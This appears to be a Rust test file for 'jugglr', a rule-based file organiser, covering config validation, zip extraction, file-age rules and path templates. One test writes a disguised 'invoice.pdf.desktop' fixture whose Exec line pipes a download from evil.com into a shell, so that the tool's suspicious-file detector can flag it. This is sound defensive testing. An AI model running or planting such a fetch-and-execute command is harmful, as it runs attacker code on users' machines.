use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tempfile::tempdir;
use zip::write::SimpleFileOptions;
use zip::ZipWriter;
use jugglr::config::{load_config, validate_config};
use jugglr::config::schema::{ConditionGroup, MatchMode};
use jugglr::engine::conditions::{is_suspicious_desktop_file, ConditionEvaluator};
use jugglr::engine::variables::ContextVariables;
use jugglr::utils::archive::extract_archive;

#[test]
fn test_advanced_rules_example_validation() {
    let example_path = Path::new("rules.example.toml");
    let config = load_config(example_path).expect("Failed to load rules.example.toml");
    assert_eq!(config.rules.len(), 10);

    let errors = validate_config(&config);
    assert!(errors.is_empty(), "Validation errors: {:?}", errors);

    // Verify all 5 new presets are disabled by default for safety
    let disabled_presets = config.rules.iter().skip(5);
    for rule in disabled_presets {
        assert!(!rule.enabled, "Preset rule '{}' must be disabled by default for safety!", rule.name);
    }
}

#[test]
fn test_suspicious_desktop_file_detection() {
    let dir = tempdir().unwrap();

    // 1. Phishing disguised desktop file
    let bad_desktop = dir.path().join("invoice.pdf.desktop");
    let mut f1 = File::create(&bad_desktop).unwrap();
    writeln!(f1, "[Desktop Entry]\nType=Application\nName=Invoice\nExec=bash -c 'curl https://evil.com/payload | sh'").unwrap();
    assert!(is_suspicious_desktop_file(&bad_desktop));

    // 2. Normal clean desktop file
    let good_desktop = dir.path().join("calculator.desktop");
    let mut f2 = File::create(&good_desktop).unwrap();
    writeln!(f2, "[Desktop Entry]\nType=Application\nName=Calculator\nExec=gnome-calculator").unwrap();
    assert!(!is_suspicious_desktop_file(&good_desktop));
}

#[test]
fn test_archive_extraction() {
    let dir = tempdir().unwrap();
    let zip_path = dir.path().join("test_archive.zip");
    let extract_dir = dir.path().join("extracted_output");

    // Create a zip archive with sample files
    {
        let file = File::create(&zip_path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options = SimpleFileOptions::default();

        zip.start_file("sample.txt", options).unwrap();
        zip.write_all(b"Hello from inside the zip!").unwrap();

        zip.start_file("nested/data.csv", options).unwrap();
        zip.write_all(b"id,name\n1,Alice").unwrap();

        zip.finish().unwrap();
    }

    // Extract archive
    let out = extract_archive(&zip_path, &extract_dir).unwrap();
    assert_eq!(out, extract_dir);

    let extracted_txt = extract_dir.join("sample.txt");
    let extracted_csv = extract_dir.join("nested/data.csv");

    assert!(extracted_txt.exists());
    assert!(extracted_csv.exists());

    let content = fs::read_to_string(&extracted_txt).unwrap();
    assert_eq!(content, "Hello from inside the zip!");
}

#[test]
fn test_file_age_conditions() {
    let dir = tempdir().unwrap();
    let file_path = dir.path().join("fresh_file.txt");
    File::create(&file_path).unwrap();

    // Condition: Newer than 1 day (should match fresh file)
    let newer_cond = ConditionGroup {
        match_mode: MatchMode::All,
        newer_than_days: Some(1),
        ..Default::default()
    };
    let res = ConditionEvaluator::evaluate(&newer_cond, &file_path).unwrap();
    assert!(res.matched, "Freshly created file should match newer_than_days: 1");

    // Condition: Older than 10 days (should NOT match fresh file)
    let older_cond = ConditionGroup {
        match_mode: MatchMode::All,
        older_than_days: Some(10),
        ..Default::default()
    };
    let res_older = ConditionEvaluator::evaluate(&older_cond, &file_path).unwrap();
    assert!(!res_older.matched, "Freshly created file should NOT match older_than_days: 10");
}

#[test]
fn test_dynamic_variable_tokens() {
    let dir = tempdir().unwrap();
    let sample_file = dir.path().join("photo_test.jpg");
    File::create(&sample_file).unwrap();

    let mut ctx = ContextVariables::from_file(&sample_file, Some("image/jpeg"), Some("abcdef1234567890"), None);
    ctx.insert("exif_year", "2025");
    ctx.insert("camera_model", "Sony_A7IV");
    ctx.insert("music_artist", "Daft_Punk");
    ctx.insert("music_album", "Discovery");

    let tpl_photo = "~/Pictures/{exif_year}/{camera_model}/{filename}";
    let res_photo = ctx.interpolate(tpl_photo);
    assert_eq!(res_photo, "~/Pictures/2025/Sony_A7IV/photo_test.jpg");

    let tpl_music = "~/Music/{music_artist}/{music_album}/{stem}.{ext}";
    let res_music = ctx.interpolate(tpl_music);
    assert_eq!(res_music, "~/Music/Daft_Punk/Discovery/photo_test.jpg");
}
